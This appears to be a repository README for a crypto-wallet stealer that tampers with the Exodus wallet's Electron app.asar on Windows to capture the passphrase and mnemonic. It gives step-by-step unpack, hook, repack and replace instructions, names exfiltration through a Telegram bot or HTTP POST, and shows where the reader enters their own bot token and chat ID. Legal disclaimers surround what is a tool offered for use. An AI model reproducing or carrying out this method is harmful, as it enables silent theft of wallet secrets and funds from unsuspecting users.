<h1>🧱 Exodus Wallet Stealer - Proof of Concept</h1>

<p><strong>Disclaimer:</strong> This project is intended for educational and research purposes only. Do not use this code or method to compromise any system without explicit permission. Unauthorized use is illegal.</p>

<p><strong>Note:</strong> This is only a <em>Proof of Concept</em>. The code quality is quite poor and not production-ready. It is meant to demonstrate a concept, not to be used as a finished tool.</p>

<h2>📦 Overview</h2>

<p>This PoC demonstrates how an attacker could manipulate the <code>Exodus Wallet</code> (a popular Electron-based cryptocurrency wallet) on <strong>Windows</strong> by unpacking and modifying its internal Electron application to:</p>

<ul>
  <li>Extract the <strong>mnemonic phrase</strong> and optional <strong>passphrase</strong></li>
  <li>Hook user input during wallet unlock</li>
  <li>Exfiltrate data to an external server or messaging service (e.g. Telegram)</li>
</ul>

<h2>🛠️ Technical Summary</h2>

<ol>
  <li><strong>Locate and unpack</strong> the <code>app.asar</code> archive from the Exodus installation directory (typically: <code>C:\Users\&lt;User&gt;\AppData\Local\exodus\app-&lt;version&gt;\resources\app.asar</code>).</li>
  <li><strong>Extract</strong> the ASAR archive using tools like <code>npx asar extract app.asar ./exodus-src</code>.</li>
  <li><strong>Modify internal logic</strong> to:
    <ul>
      <li>Hook the Electron frontend input handling where the passphrase and mnemonic are entered.</li>
      <li>Inject custom JavaScript methods to capture and export those values.</li>
    </ul>
  </li>
  <li><strong>Edit</strong> <code>main.js</code> (Electron's main process file) to:
    <ul>
      <li>Set up a data exfiltration routine (e.g., via HTTP POST to external server or Telegram Bot API).</li>
      <li>Ensure persistence or stealth if needed (optional for PoC).</li>
    </ul>
  </li>
  <li><strong>Repack</strong> the modified source into a new <code>app.asar</code> using <code>npx asar pack ./exodus-src ./app.asar</code>.</li>
  <li><strong>Replace</strong> the original <code>app.asar</code> in the Exodus install folder with the malicious one.</li>
  <li>Launch Exodus — the application will function normally, but sensitive data will now be intercepted and exfiltrated silently.</li>
</ol>

<h2>🚨 Exfiltration Methods</h2>

<p>The PoC supports multiple exfiltration vectors:</p>

<ul>
  <li><strong>Telegram Bot</strong>: Send mnemonic/passphrase to a chat via Bot API</li>
  <li><strong>Remote HTTP Server</strong>: POST sensitive data to a controlled endpoint</li>
  <li><strong>Custom WebSocket or Cloud Services</strong> (optional)</li>
</ul>

<h2>⚙️ Telegram Bot Configuration</h2>

<p>To enable Telegram exfiltration, you must update the bot credentials in the following file:</p>

<pre><code>app_unpacked\src\app\main\index.js</code></pre>

<ul>
  <li><strong>Line 20:</strong> Replace with your Telegram chat ID.</li>
  <li><strong>Line 21:</strong> Replace with your Telegram Bot token (created via <a href="https://t.me/BotFather" target="_blank">@BotFather</a>).</li>
</ul>

<p>Example:</p>

<pre><code>const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';      // Line 20
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // Line 21
</code></pre>

<h2>💡 Notes</h2>

<ul>
  <li>This works because Exodus is built with <strong>Electron</strong> and <strong>Node.js</strong>, where app logic is stored in an easily modifiable ASAR archive.</li>
  <li>No privilege escalation is needed if the user runs the wallet with default permissions.</li>
  <li>The wallet UI continues to function normally, making the attack stealthy.</li>
</ul>

<h2>⚠️ Legal Notice</h2>

<p>This repository is strictly for cybersecurity research, reverse engineering education, and red team simulation.<br>
Do <strong>NOT</strong> use this PoC to target or compromise real users or systems without full consent.</p>

<hr>

<h2>🔧 Requirements</h2>

<ul>
  <li>Node.js &amp; NPM (for ASAR tooling)</li>
  <li>asar: <code>npm install -g asar</code></li>
  <li>Basic knowledge of Electron and JavaScript</li>
</ul>

<h2>✅ PoC Status</h2>

<ul>
  <li>✅ Extraction of passphrase</li>
  <li>⏳ Extraction of mnemonic phrase</li>
  <li>✅ Custom exfiltration logic injection</li>
  <li>✅ Works on default Exodus installations (Windows)</li>
</ul>

<h2>👁️‍🗨️ Ethical Reminder</h2>

<p>Engaging in unauthorized access or data theft is a criminal offense in most jurisdictions.<br>
Always use offensive security knowledge responsibly.</p>
